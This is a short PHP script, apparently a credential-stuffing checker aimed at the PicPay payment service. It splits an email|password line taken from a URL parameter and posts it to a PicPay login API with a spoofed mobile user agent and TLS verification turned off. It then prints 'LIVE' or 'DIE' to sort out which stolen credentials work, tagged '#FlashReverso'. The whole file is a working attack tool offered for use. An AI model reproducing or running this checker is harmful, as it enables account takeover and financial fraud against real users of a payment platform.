<?php
error_reporting(0);
extract($_POST);

$linha = $_GET["linha"];
$email = explode("|", $linha)[0];
$senha = explode("|", $linha)[1];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://ws3748592638.picpay.com/api/userLogin.json');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
    'Host: ws3748592638.picpay.com',
    'Connection: Keep-Alive',
    'Content-Type: application/json; charset=utf-8',
    'User-Agent: okhttp/3.8.1'
));
        curl_setopt($ch, CURLOPT_POSTFIELDS, '{
 "email": "'.$email.'",
 "password": "'.$senha.'"
}');
        curl_setopt($ch, CURLOPT_POST, 1);
        $result = curl_exec($ch);

        if (strpos($result, 'Para acessar sua conta em um novo dispositivo')) {
        echo "LIVE → $email|$senha #FlashReverso";
        }else{
        echo "DIE → $email|$senha";
        }
?>